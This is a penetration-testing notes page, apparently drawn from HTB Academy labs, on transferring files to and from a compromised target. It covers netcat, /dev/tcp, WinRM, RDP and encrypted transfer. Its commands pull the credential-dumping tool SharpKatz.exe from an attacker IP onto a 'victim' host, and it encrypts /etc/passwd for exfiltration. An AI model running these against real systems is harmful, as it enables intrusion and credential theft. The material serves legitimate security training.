# Additional Methods

## Normal File Transfer

### Netcat & Ncat

At the **Target** we run netcat or ncat and listen to port 8000.

```shell-session
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
victim@target:~$ # OR
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

> `--recv-only` is used in ncat to close the connection once the file transfer is finished.

On the **Attack** machine, run the following for (**nc/netcat**)

```shell-session
kali@kali:~$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

On the **Attack** machine, run the following for (**ncat**)

```shell-session
kali@kali:~$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

#### Incase of a firewall blocking inbound connections

We can change to listen on the **Attack** machine instead.

```shell-session
kali@kali:~$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
kali@kali:~$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

And on the **Target** machine we can run the following for (nc/netcat)

```shell-session
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

And on the **Target** machine we can run the following for (ncat)

```shell-session
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If both nc and ncat doens't exists on the **target** system, we could use /dev/TCP/ eg.

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Remoting (WinRM)

**From DC01**

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

**To copy DC01 > DB01**

<pre class="language-powershell"><code class="lang-powershell">PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
<strong>PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
</strong></code></pre>

**To copy DB01 > DC01**

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP

**Mounting a Linux Folder Using xfreerdp**

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

**Mounting a Linux Folder Using xfreerdp**

```shell-session
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

After mounting the directory we can access it by connecting to `\\tsclient\`&#x20;

![Mounted drive appeared on the file explorer](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)

> For windows we can use mstsc.exe remote desktop client.
>
> <img src="https://academy.hackthebox.com/storage/modules/24/rdp.png" alt="image" data-size="original">

## Protected File Transfer

### Windows

The easiest method is to use the script [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions/Invoke-AESEncryption.ps1).

```powershell-session
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
PS C:\htb> Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

&#x20;The `Invoke-AESEncryption.ps1` will create a copy of a file (encrpyted) with a `.aes` extension.

### **Linux**

To **encrypt**, run the following

```shell-session
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

To **decrypt**, run the following

```shell-session
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

{% hint style="info" %}
`-pbkdf2` = Password-Based Key Derivation Function 2 algorithm
{% endhint %}

## Living off the Land

The following resources are useful for the Living off the Land, the term is used for utilizing the tools and binaries on the target machine to perform functions such as download, upload, command execution, read file, write file, and bypasses.

* [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
* [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

## Resources

Most of the commands and contents are from **HTB academy lab!**
